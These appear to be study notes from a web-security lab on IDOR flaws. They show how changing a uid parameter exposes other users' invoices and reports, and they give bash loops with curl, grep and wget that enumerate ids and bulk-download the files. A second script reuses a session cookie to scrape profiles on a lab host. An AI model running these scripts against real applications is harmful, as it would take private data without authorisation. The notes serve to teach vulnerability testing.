Exploiting IDOR vulnerabilities is easy in some instances but can be very challenging in others. Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.

## Insecure Parameters
Web application sets the `uid` parameter 1. 

http://SERVER_IP:PORT/documents.php?uid=1
![[Pasted image 20250220163603.png]]

The documents attached to this `uid` have the following naming convention:

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

Invoice_UID_MONTH_YEAR.pdf
Report_UID_MONTH_YEAR.pdf

This is the most basic type of IDOR vulnerability and is called `static file IDOR`. However, to successfully fuzz other files, we would assume that they all start with `Invoice` or `Report`, which may reveal some files but not all


Change the `uid` in the URL to 2 to see if we can access another users documents.

http://SERVER_IP:PORT/documents.php?uid=2
![[Pasted image 20250220164002.png]]

Confirm but checking the attached documents names, which are now
```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

### Exploit Automation
The source code of the webpage and the documents goes as so
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

We can grep out `<li class='pure-tree_link'>` to just get the links and the further grep it out to just get the document paths.

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Now a simple batch script that using a for loop to list out all of the documents and download them

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

#### ANOTHER EXAMPLE SCRIPT
```bash
#!/bin/bash
url="http://careers.inlanefreight.local"

for i in {1..100}; do
        curl -s "$url/profile?id=$i" -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.Z8mSVQ.pqUXNXJRLS-dC2NLEXhzKTOVDo0' | grep "Jobs applied by *"
done

```